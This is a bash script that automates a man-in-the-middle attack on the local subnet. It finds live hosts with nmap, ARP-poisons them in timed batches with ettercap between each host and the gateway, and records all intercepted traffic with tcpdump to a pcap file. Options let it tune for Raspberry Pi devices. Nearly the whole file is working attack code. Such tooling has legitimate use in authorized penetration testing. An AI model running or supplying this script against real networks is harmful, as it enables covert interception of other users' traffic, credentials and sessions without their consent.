#!/bin/bash
ShowUsage() {
	echo ""
	echo "Usage: $0 <base name> [Optional time per host] [Optional hosts/block]"
	echo "$0 will do a ping discovery on the local subnet and cycle through blocks of 8 hosts at a time (less for ARM processors like Raspberry Pi) doing ARP poisoning and recording the packets to pcap files."
	echo "By default, hosts will be poisonedin blocks of 8 hosts for 8 minutes at a time.  An optional time and block size can be specified to override this value.  Format is specified such as 7m, 30s, or 1h."
	echo ""
}

if [ $# -eq 0 ]; then
	ShowUsage
	exit 1
fi

BASENAME="$1"
DEFROUTE_INT=`route -n | grep "^0.0.0.0" | grep -v "tun[0-9]" | head -1 | awk '{print $8}'`

if [ ${#DEFROUTE_INT} -eq 0 ]; then
	echo "ERROR: unable to identify default route adapter from routing table."
	echo "Default route:"
	route -n | grep "^0.0.0.0"
	exit 1
fi

ARPINTERFACE="$DEFROUTE_INT"

MYIP=`ifconfig $ARPINTERFACE | grep -Eio "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | head -1`
GATEWAY=`route -n | grep "^0.0.0.0" | head -1 | awk '{print $2}'`
# GATEWAY=`route -n | grep "^0.0.0.0" | sed "s|^0.0.0.0\s||" | grep -Eio "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | head -1`
LOCALSUBNET=`ifconfig $ARPINTERFACE | grep -Eio "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | head -1 | grep -Eio "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"`
LOCALSUBNET=`echo "$LOCALSUBNET.0/24"`


# NUMCORES=`cat /proc/cpuinfo | awk '/^processor/{print $3}' | wc -l`
# echo "[`date`] Tuning to number of CPU cores..."

# Check if we're on a Raspberry Pi by the build
uname -a | grep -q "armv6l"

if [ $? -eq 0 ]; then
	# We're on an ARM processor (probably a PI)
	# Even 2 resulted in dropped interface packets.  1 seemed to be okay.
	MAXRUNNINGPOISONS=1
	MAXPOISONTIME="8m"
	
	# Check that the CPU governor is not enabled.
	if [ -e /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor ]; then
		echo -n performance > /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor
	fi
else
	# We're not on an ARM processor so go with the normal settings.
	MAXRUNNINGPOISONS=8
	MAXPOISONTIME="8m"
fi

if [ $# -ge 2 ]; then
	MAXPOISONTIME=$2
fi

if [ $# -ge 3 ]; then
	MAXRUNNINGPOISONS=$3
fi

echo ""
echo "[`date`] Started automated MitM captures for $LOCALSUBNET on $ARPINTERFACE."
echo "         Systems will be poisoned in blocks of $MAXRUNNINGPOISONS at $MAXPOISONTIME per system..."
echo ""
nmap -sn -oA $BASENAME $LOCALSUBNET > /dev/null

LIVEHOSTS=`cat $BASENAME.gnmap | grep "Status: Up" | grep -Eio "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"`
LIVEHOSTS=`echo "$LIVEHOSTS" | grep -v -e $MYIP -e $GATEWAY`
NUMHOSTS=`echo "$LIVEHOSTS" | wc -l`

echo "[`date`] Found $NUMHOSTS live hosts.  Starting packet capture..."
nice -10 tcpdump -nqi $ARPINTERFACE -w $BASENAME.cap 1>/dev/null 2>/dev/null &
echo ""
HOSTCOUNT=0
INCREMENTALCOUNT=0
POISONHOSTSTRING=""

for CURHOST in $LIVEHOSTS; do
	# Note -u says unoffensive (let kernel handle ip_forwarding). -D deamonize.  Needed for performance or

	HOSTCOUNT=$((HOSTCOUNT+1))
	INCREMENTALCOUNT=$((INCREMENTALCOUNT+1))
	
	if [ ${#POISONHOSTSTRING} -gt 0 ]; then
		if [ ! "$CURHOST" = "$GATEWAY" ]; then
			POISONHOSTSTRING=`echo "$POISONHOSTSTRING;$CURHOST"`
		fi
	else
		POISONHOSTSTRING="$CURHOST"
	fi

	if [ $INCREMENTALCOUNT -eq $MAXRUNNINGPOISONS -o $HOSTCOUNT -eq $NUMHOSTS ]; then
		echo "[`date`] Poisoning $POISONHOSTSTRING for $MAXPOISONTIME..."
		#	timeout $MAXPOISONTIME ettercap -Toq -M arp:remote -w $CURHOST.cap -i $ARPINTERFACE /$POISONHOSTSTRING/ /$GATEWAY/ 2>&1 1>/dev/null &
		# Added ports to the end of the gateway string, not that it would impact the MitM and the capture, but hopefully cut down
		# on any inspection done by ettercap to improve performance
		# Note: the -o parameter below says MitM only.  No password monitoring/decoding
		nice -10 timeout $MAXPOISONTIME ettercap -Toq -M arp:remote -i $ARPINTERFACE /$POISONHOSTSTRING/ /$GATEWAY/ 2>&1 1>/dev/null
		INCREMENTALCOUNT=0
		POISONHOSTSTRING=""
	fi
done

while true; do
	RUNNINGCOUNT=`ps aux | grep timeout | grep ettercap | wc -l`
	if [ $RUNNINGCOUNT -ge 1 ]; then
		echo -n "."
		sleep 10s
	else
		echo ""
		break
	fi
done


clear

# Make sure we cleaned up
pkill ettercap
# Stop the capture
pkill tcpdump

echo "[`date`] Done.  Poisoned $NUMHOSTS for $MAXPOISONTIME and wrote output to $BASENAME.cap"
